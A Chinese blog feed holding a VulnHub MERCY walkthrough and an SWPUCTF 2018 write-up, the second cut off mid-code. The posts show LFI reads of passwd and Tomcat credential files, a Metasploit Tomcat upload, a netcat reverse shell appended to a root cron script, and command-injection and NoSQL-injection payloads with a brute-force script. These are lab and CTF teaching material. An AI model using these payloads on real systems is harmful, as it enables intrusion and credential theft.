    <content type="html"><![CDATA[<h1 id="vulnhub-渗透测试digitalworld-local-MERCY"><a href="#vulnhub-渗透测试digitalworld-local-MERCY" class="headerlink" title="vulnhub|渗透测试digitalworld.local: MERCY"></a>vulnhub|渗透测试digitalworld.local: MERCY</h1><h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><p>最近在打靶机，发现一个有点东西的靶机，这里跟大家分享一下.</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>vulnhub最近出的一台靶机</p><p>靶机<br>MERCY.zip (Size: 1.9 GB)</p><p>Download: <a href="https://drive.google.com/uc?id=1YzsW1lCKjo_WEr6Pk511DXQBFyMMR14y&amp;export=download" target="_blank" rel="noopener">https://drive.google.com/uc?id=1YzsW1lCKjo_WEr6Pk511DXQBFyMMR14y&amp;export=download</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/digitalworld/MERCY.zip.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/digitalworld/MERCY.zip.torrent</a>     ( Magnet)</p><p>攻击机 Kali IP 10.10.10.129</p><p>靶机在同一C段下 IP 10.10.10.134</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用命令nmap -sP 10.10.10.0/24<br><img src="/1/1.jpg" alt=""><br>起始Ip 10.10.10.1，攻击机的ip是10.10.10.128，而10.10.10.254是结束ip。因为环境配置为dhcp动态分布，所以说我们的靶机ip就是10.10.10.134</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>我们需要知道目标机器上开了哪些端口，运行了哪些服务，利用某些服务的漏洞来进行攻击，所以我们先进行端口扫描。</p><p>nmap -n -v -Pn -p- -A –reason 10.10.10.134</p><p>-n (numeric) 直接显示ip地址以及端口，不解析为服务名或者主机名</p><p>-Pn不对目标进行ping探测（不判断主机是否在线）（直接扫描端口）</p><p>-p- 扫描全部端口</p><p>-A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描</p><p>–reason：显示端口处于特定状态的原因</p><p>NMAP输出示出了各种打开的端口：22（SSH），53（结构域），80（HTTP），110（POP3），139（NetBIOS的SSN），143（IMAP），445（NetBIOS的SSN），993（SSL / IMAPS），995（SSL / POP3），8080（HTTP）。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>因为端口80进行过滤无法直接访问。这里我们访问8080端口</p><p><img src="/1/2.png" alt=""><br>其中用户相关信息的定义路径/etc/tomcat7/tomcat-users.xml</p><p><a href="http://10.10.10.134:8080/manager/html" target="_blank" rel="noopener">http://10.10.10.134:8080/manager/html</a><br><img src="/1/3.png" alt=""></p><p>发现</p><p><role rolename="manager-gui"></role></p><user username="tomcat" password="s3cret" roles="manager-gui"><p>由于445端口是在目标机器上打开时，我们想到了用枚举它的enum4linux工具。</p><p><img src="/1/4.png" alt=""></p><p>在\10.10.10.134\qiu.private\opensesame\下发现config文件</p><p>get将他下载下来</p><p><img src="/1/5.png" alt=""></p><p>cat config</p><p>发现openHTTP需要敲门顺序号<br><img src="/1/6.png" alt=""></p><h2 id="打开HTTP和ssh"><a href="#打开HTTP和ssh" class="headerlink" title="打开HTTP和ssh"></a>打开HTTP和ssh</h2><p>Port Knocking</p><p>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</p><p>让我们写一个端口knock脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">TARGET=$1</span><br><span class="line">PORTS=$2</span><br><span class="line"></span><br><span class="line">for ports in $(tr &apos;,&apos; &apos; &apos; &lt;&lt;&lt;&quot;$PORTS&quot;); do</span><br><span class="line">    echo &quot;[*] Trying sequence $ports...&quot;</span><br><span class="line">    for p in $(echo $ports | tr &apos;,&apos; &apos; &apos;); do</span><br><span class="line">        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET</span><br><span class="line">    done</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>敲门后发现80端口被打开了<br><img src="/1/7.png" alt=""></p><p>我们再把22端口打开<br><img src="/1/8.png" alt=""></p><p>但是本机还是访问不了，只能虚拟机才能访问<br>发现Port Knocking保护的服务器只有knock的机子才能访问<br><img src="/1/10.png" alt=""></p><p>dirb <a href="http://10.10.10.134/" target="_blank" rel="noopener">http://10.10.10.134/</a><br>列目录<br><img src="/1/9.png" alt=""></p><p>robots.txt下</p><p>User-agent: *<br>Disallow: /mercy<br>Disallow: /nomercy</p><p><a href="http://10.10.10.134/nomercy/" target="_blank" rel="noopener">http://10.10.10.134/nomercy/</a><br><img src="/1/11.png" alt=""><br>用searchsploit搜索RIPS 0.53以上的漏洞是一个多本地文件包含漏洞<br><img src="/1/12.png" alt=""><br>看下poc: <a href="http://10.10.10.134/nomercy/windows/code.php?file=../../../../../../etc/passwd" target="_blank" rel="noopener">http://10.10.10.134/nomercy/windows/code.php?file=../../../../../../etc/passwd</a><br><img src="/1/13.png" alt=""></p><p>因为我们知道有一个Tomcat服务在目标系统上运行，我们可以看看在Tomcat的users.xml中使用LFI文件包含</p><p><a href="http://10.10.10.134/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml" target="_blank" rel="noopener">http://10.10.10.134/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml</a></p><p><img src="/1/14.png" alt=""></p><p>该文件将为我们提供的用户名和密码，探索它的浏览器给了我们两个tomcat服务器的登录凭据</p><h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><p>使用Metasploit工具的Tomcat管理器中使用以下凭据登录到Tomcat服务器“thisisasuperduperlonguser：heartbreakisinevitable</p><p>msf &gt; use exploit/multi/http/tomcat_mgr_upload<br>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 10.10.10.134<br>rhost =&gt; 10.10.10.134<br>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080<br>rport =&gt; 8080<br>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername thisisasuperduperlonguser<br>httpusername =&gt; thisisasuperduperlonguser<br>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword heartbreakisinevitable<br>httppassword =&gt; heartbreakisinevitable<br>msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit </p><p><img src="/1/15.png" alt=""></p><p>用python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>建立一个原生终端</p><p>su qiu<br>mercyplz</p><p><img src="/1/17.png" alt=""></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在遍历/home/qiu/.private/secrets我注意到一个脚本“timeclock”将运行后每三分钟（根据root权限）来写入当前日期/var/www/html/time</p><p><img src="/1/18.png" alt=""><br>创建一个使用Msfvenom生成的一个bash代码：<br>msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.129 lport=8888 R</p><p><img src="/1/19.png" alt=""></p><p>echo “mkfifo /tmp/feib; nc 10.10.10.129 8888 0&lt;/tmp/feib | /bin/sh &gt;/tmp/feib 2&gt;&1; rm /tmp/feib” &gt;&gt;timeclock</p><p>开启监听<br>nc -lvp 8888<br><img src="/1/20.png" alt=""></p><p>获得root权限</p></user>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vulnhub-渗透测试digitalworld-local-MERCY&quot;&gt;&lt;a href=&quot;#vulnhub-渗透测试digitalworld-local-MERCY&quot; class=&quot;headerlink&quot; title=&quot;vulnhub|渗透测试digitalw
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF 2018 Web题和线下赛总结</title>
    <link href="http://yoursite.com/2019/01/03/swpuctf%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/01/03/swpuctf总结/</id>
    <published>2019-01-03T07:24:00.000Z</published>
    <updated>2020-04-07T15:42:24.528Z</updated>
    
    <content type="html"><![CDATA[<p>第九届swpuctf杂项题，web题加线下赛攻防总结</p><h1 id="线上赛"><a href="#线上赛" class="headerlink" title="线上赛"></a>线上赛</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="流量签到题"><a href="#流量签到题" class="headerlink" title="流量签到题"></a>流量签到题</h3><p>流量包拖wireshark追TCP包或者直接用文档编辑器打开ctrl加f搜索关键字</p><h3 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h3><p>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33<br>键盘密码 99就代表9那列的第二个值</p><p>look ….. 依次读就行了</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>第一个flag在文件末尾</p><p><img src="/swpu/11.png" alt=""><br>所以修改高度为FF在底部可以看到另一半flag<br><img src="/swpu/12.png" alt=""></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h3><p>这个题发现<a href="http://www.zip下有个源码泄露，下载来发现代码如下" target="_blank" rel="noopener">www.zip下有个源码泄露，下载来发现代码如下</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成优惠码</span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用mt_srand函数设置随机数种子，mt_rand函数来生成随机数</p><p>这里利用了这个伪随机数函数的漏洞，无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的<br>这里有个php的随机数的安全性分析<br><a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">php的随机数的安全性分析</a></p><p>测试发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function rrrand()&#123;</span><br><span class="line"></span><br><span class="line">$str = &quot;EbTyOzZEZeJAgmJ&quot;;</span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">    if ($i &lt;= (15 / 2)) &#123;</span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line">        $pos = 62 - $pos;</span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rrrand();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后发现题目注册用户登录后，会得到一个优惠码EbTyOzZEZeJAgmJ<br>然而在使用的时候会提示已失效，原因是15位的优惠码，这里要24位的，于是思路就是跑出随机数种子，然后用原来的脚本将位数跑到24位</p><p>于是使用工具php_mt_seed<br><a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p><p>下面演示破解过程,首先获得在每一位在字符串中的位置可以使用php_mt_seed这款工具进行爆破 但是需要一定的格式</p><p>附上自己的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function rrrand()&#123;</span><br><span class="line"></span><br><span class="line">$str = &quot;EbTyOzZEZeJAgmJ&quot;;</span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">    if ($i &lt;= (15 / 2)) &#123;</span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line">        $pos = 62 - $pos;</span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rrrand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行结果</p><p><img src="/swpu/1.png" alt=""></p><p>将php_mt_seed.c放到kali里编译一下<br>gcc -o 123 php_mt_seed (123为php_mt_seed.c文件编译后的文件名)</p><p>chmod 777 123 赋予执行权限</p><p>./123 40 40 0 61 1 1 0 61 55 55 0 61 24 24 0 61 50 50 0 61 25 25 0 61 61 61 0 61 40 40 0 61 1 1 0 61 58 58 0 61 17 17 0 61 26 26 0 61 56 56 0 61 50 50 0 61 17 17 0 61</p><p><img src="/swpu/2.png" alt=""></p><p>跑出随机数种子8228378 (PHP 7.1.0+)<br>经过测试发现 php7.0和php7.2同一种子生成的随机数序列是<br>不一样的<br>刚好通过返回包可以看的php版本7.2所以这里要注意个问题，跑脚本的时候运行环境不对跑出来就会是错的</p><p>用随机数种子去生成优惠码的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成优惠码</span><br><span class="line">$_SESSION[&apos;seed&apos;]=813929762;</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">    mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=24;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">            $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">            $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $auth;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">youhuima();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行的结果为<br><img src="/swpu/3.png" alt=""></p><p>EbTyOzZEbWr0UmJmbVMOMYOQ<br>进入第二关</p><p>if (preg_match(“/^\d+.\d+.\d+.\d+$/im”,$ip)){<br>    if (!preg_match(“/\?|flag|}|cat|echo|*/i”,$ip)){<br>           //执行命令<br>    }else {<br>          //flag字段和某些字符被过滤!<br>    }<br>}else{<br>         // 你的输入不正确!<br>}<br>限制了ip的格式但是这里使用换行符%0a即可轻松绕过，匹配ip时用了/m 且^ $必须匹配头尾，%0a换行绕过检测，关键词过滤:发现通配符?以及*都被过滤<br>c\at /fl\ag<br>a=c b=at c=fl d=ag $a$b$c$d变量赋值法去绕过<br>payload:127.0.0.1%0aa=c b=at c=fl d=ag $a$b$c$d<br>payload:127.0.0.1%0ac\at /fl\ag</p><p>要想读到/flag中的内容 但是flag字符串也被过滤了<br>可以以通过 f’la’g 或f[l][a]g等来绕过<br>payload:127.0.0.1%0ac’a’t /f’la’g</p><p>Injection ???</p><p>题目提示了<br>infio.php查看下去，发现<br>猜测题目应该使用了MongoDB<br>那么应该可以判断为NoSQL注入<br>那么进行盲注：<br>尝试注入username=admin&amp;password[$regex]=^**<br>这里队友写了一个爆破脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">from urllib.request import urlretrieve</span><br><span class="line"></span><br><span class="line">j=0</span><br><span class="line">passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]</span><br><span class="line">payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;</span><br><span class="line">url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun&#123;&#125;&amp;vertify=&#123;&#125;&quot;</span><br><span class="line">img_url = &apos;http://123.206.213.66:45678/vertify.php&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">while j&lt;len(payload):</span><br><span class="line">s = requests.session()</span><br><span class="line">payloads = payload[j]</span><br><span class="line">with open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;,&apos;wb&apos;) as fd:</span><br><span class="line">img_1 = s.get(url=img_url)</span><br><span class="line">fd.write(img_1.content)</span><br><span class="line">image = Image.open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;)</span><br><span class="line">vcode = pytesseract.image_to_string(image)</span><br><span class="line">url_1 = url.format(str(payloads),vcode)</span><br><span class="line">r = s.get(url_1,cookies=img_1.cookies)</span><br><span class="line">print(r.text)</span><br><span class="line">if &quot;wrong CAPTCHA!&quot; in r.text:</span><br><span class="line">continue</span><br><span class="line">if &quot;username or password incorrect!&quot; in r.text:</span><br><span class="line">print(payloads)</span><br><span class="line">j = j+1</span><br><span class="line">break</span><br><span class="line">if &quot;Nice!But it is not the real passwd&quot; in r.text:</span><br><span class="line">passw0rd.append(payloads)</span><br><span class="line">print(&quot;passw0rd is :&quot; + str(passw0rd))</span><br><span class="line">j = j+1</span><br><span class="line">break</span><br></pre></td></tr></table></figure></p><p>其次就是验证<br>码的问题，这个可以用python3的pytesseract库识别，当然也可以手工注入</p><p>可以确定就是nosql注入了，那就很好办了，拿到正<br>确密码，这里可以通过mongodb的条件操作符 $regex 来用正则匹配<br>:<br><a href="http://123.206.213.66:45678/check.php?username[$ne]=xxx&amp;password[$regex]=^xxx&amp;vertify=xxxx" target="_blank" rel="noopener">http://123.206.213.66:45678/check.php?username[$ne]=xxx&amp;password[$regex]=^xxx&amp;vertify=xxxx</a></p><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p>upload_file.php处 上传文件<br>file.php处 查看文件源码<br>file.php源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content‐type:text/html;charset=utf‐8&quot;);</span><br><span class="line">include &apos;function.php&apos;;</span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&apos;file&apos;] : &quot;&quot;;</span><br><span class="line">if(empty($file)) &#123;</span><br><span class="line">echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$show = new Show();</span><br><span class="line">if(file_exists($file)) &#123;</span><br><span class="line">$show‐&gt;source = $file;</span><br><span class="line">$show‐&gt;_show();</span><br><span class="line">&#125; else if (!empty($file))&#123;</span><br><span class="line">die(&apos;file doesn\&apos;t exists.&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//show_source(__FILE__);</span><br><span class="line">include &quot;base.php&quot;;</span><br><span class="line">header(&quot;Content‐type: text/html;charset=utf‐8&quot;);</span><br><span class="line">error_reporting(E_ERROR | E_PARSE);</span><br><span class="line">foreach (array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request)</span><br><span class="line">&#123;</span><br><span class="line"> foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line"> &#123;</span><br><span class="line"> $$_key= addslashes($_value);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">function upload_file_do() &#123;</span><br><span class="line">global $_FILES;</span><br><span class="line">$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;</span><br><span class="line">//mkdir(&quot;upload&quot;,0777);</span><br><span class="line">if(file_exists(&quot;upload/&quot; . $filename)) &#123;</span><br><span class="line"> unlink($filename);</span><br><span class="line">&#125;</span><br><span class="line">move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);</span><br><span class="line">echo &apos;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">function upload_file() &#123;</span><br><span class="line">global $_FILES;</span><br><span class="line">if(upload_file_check()) &#123;</span><br><span class="line"> upload_file_do();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">function upload_file_check() &#123;</span><br><span class="line">global $_FILES;</span><br><span class="line">$allowed_types = array(&quot;gif&quot;,&quot;jepg&quot;,&quot;jpg&quot;,&quot;png&quot;);</span><br><span class="line">$temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">$extension = end($temp);</span><br><span class="line">if(empty($extension)) &#123;</span><br><span class="line"> //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"> if(in_array($extension,$allowed_types)) &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else &#123;</span><br><span class="line"> echo &apos;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invild file!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>class.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 